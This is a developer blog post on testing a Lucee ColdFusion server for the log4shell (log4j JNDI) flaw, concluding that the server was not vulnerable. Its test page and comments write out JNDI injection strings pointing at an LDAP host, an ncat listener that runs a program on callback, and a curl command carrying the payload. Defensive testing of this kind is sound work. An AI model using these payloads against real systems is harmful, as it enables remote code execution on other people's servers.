---
title: ColdFusion log4shell
date: 2021-12-13
tags:
    - coldfusion
---

In light of the "wonderful" log4j exploit, I was tasked with exploring my company's ColdFusion
codebase to see if it was exploitable. We are using a flavor of ColdFusion called Lucee.

In summary, Lucee 5.3.4 was not vulnerable. This fact was also confirmed in this [official Lucee post](https://dev.lucee.org/t/lucee-is-not-affected-by-the-log4j-jndi-exploit-cve-2021-44228/9331).

This page will provide a basic interface to test the exploit described in https://github.com/leonjza/log4jpwn.
See notes in bottom of source for initializing reverse shell.

`log4shell.cfm`

```
<html>
  <body>
    <h2>log4shell test</h2>
    <hr>
    <div style="margin-bottom: 50px;">
        Setup attacker with &nbsp;<code>ncat -k -vv -c "calc.exe" -l 18081</code>
        <br>
        Try this: &nbsp;<code>${jndi:ldap://192.168.10.123:18081/a}</code>
    </div>
    <form action="./index.cfm">
        <label for="logIt">Enter string to log:</label>
        <input type="text" id="logIt" name="logIt" required></input>
        <input type="submit" value="submit"/>
    </form>
    <cfscript>
      main();
      private void function main(){
        if (structKeyExists(url, 'logIt')) {
            writeOutput('You entered: <code>#url.logIt#</code>');
            writeLog(file='log4shell', text='#url.logIt#', type='error'); // nothing
            writeDump(var='#url.logIt#', output='console');               // nothing
            systemOutput('#url.logIt#');                                  // nothing
        }
      }
      /*  Other notes
        Basic log4shell test to ensure my reverse shell was working right
          - clone and build https://github.com/leonjza/log4jpwn
          - ncat -k -vv -c "calc.exe" -l 8081
          - docker run --rm -p8080:8080 log4jpwn
          - curl -H 'User-Agent: ${jndi:ldap://192.168.10.123:18081/a}' localhost:8081
          - This opens calculator on target system
        Setup this testing page in lucee (5.3.4) at /log4shell.cfm
          - ncat -k -vv -c "calc.exe" -l 18081
          - https://myserver:8482/log4shell.cfm?logIt=%24%7Bjndi%3Aldap%3A%2F%2F192.168.10.123%3A18081%2Fa%7D
          - entered value '${jndi:ldap://192.168.10.123:18081/a}' into form and submitted
          - Lucee seems to be safe
        
        Also read: https://dev.lucee.org/t/lucee-is-not-affected-by-the-log4j-jndi-exploit-cve-2021-44228/9331
      */
    </cfscript>
  </body>
</html>
```

A gist for this code is available [here](https://gist.github.com/barrettotte/01ef8db67b30af49533f83552b5d0450).
